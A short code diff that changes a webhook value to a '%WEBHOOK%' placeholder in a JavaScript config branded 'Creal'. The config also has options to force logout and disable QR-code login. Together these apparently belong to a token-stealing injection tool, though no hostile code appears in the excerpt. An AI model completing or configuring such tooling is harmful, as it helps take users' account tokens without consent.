@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "Creal",
 
-    webhook: "$$$",
+    webhook: "%WEBHOOK%",
 
     logout: true,
     disable_qr_code: true,
